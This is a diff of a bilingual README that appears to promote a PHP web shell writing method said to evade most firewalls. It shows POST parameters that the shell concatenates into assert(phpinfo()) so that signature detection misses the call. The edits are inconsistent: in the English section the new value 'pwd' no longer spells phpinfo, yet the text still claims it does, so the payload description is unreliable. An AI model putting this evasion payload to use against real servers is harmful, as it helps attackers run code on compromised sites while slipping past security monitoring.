@@ -3,7 +3,7 @@
 
 使用post发送如下参数
 
-hack1=ass&hack2=ert&hack3=phpi&hack4=fo()
+hack1=ass&hack2=ert&hack3=phpi&hack4=fo()&hack5=pwd
 
 
 hack1会和hack2拼接，hack3会和hack4拼接而形成assert(phpinfo())
@@ -12,7 +12,7 @@ I have discovered a new writing method for PHP shell that can bypass most of the
 
 Send the following parameters using post
 
-hack1=ass&hack2=ert&hack3=phpi&hack4=fo（）
+hack1=ass&hack2=ert&hack3=phpi&hack4=pwd
 
 Hack1 will be spliced with Hack2, and Hack3 will be spliced with Hack4 to form an assert (phpinfo())
 ![1](https://user-images.githubusercontent.com/90552883/229515220-742c99b2-a06f-4f30-99b9-c57b3a1c373a.PNG)
